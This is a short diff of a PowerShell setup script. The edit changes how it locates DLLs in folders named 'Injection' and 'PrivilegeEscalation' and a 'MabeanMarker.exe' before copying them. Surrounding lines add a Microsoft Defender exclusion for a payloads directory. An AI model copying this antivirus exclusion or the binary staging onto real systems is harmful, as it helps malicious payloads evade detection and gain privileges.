@@ -52,9 +52,9 @@ if (-Not (Test-Path $keyBinPath)) {
     [System.IO.File]::WriteAllBytes($keyBinPath, $key)
 }
 
-Copy-Item ".\MabeanScripts\Injection\1\x64\Release\1.dll" -Destination (Join-Path $dlls "1.dll")  -Force
-Copy-Item ".\MabeanScripts\PrivilegeEscalation\2\x64\Release\2.dll" -Destination (Join-Path $dlls "2.dll")  -Force
-Copy-Item ".\MabeanMarker.exe" -Destination (Join-Path $dataDir "MabeanMarker.exe")  -Force
+Copy-Item "$PSScriptRoot\MabeanScripts\Injection\1\x64\Release\1.dll" -Destination (Join-Path $dlls "1.dll")  -Force
+Copy-Item "$PSScriptRoot\MabeanScripts\PrivilegeEscalation\2\x64\Release\2.dll" -Destination (Join-Path $dlls "2.dll")  -Force
+Copy-Item "$PSScriptRoot\MabeanMarker.exe" -Destination (Join-Path $dataDir "MabeanMarker.exe")  -Force
 
 Set-MpPreference -ExclusionPath $payloadsDir
 
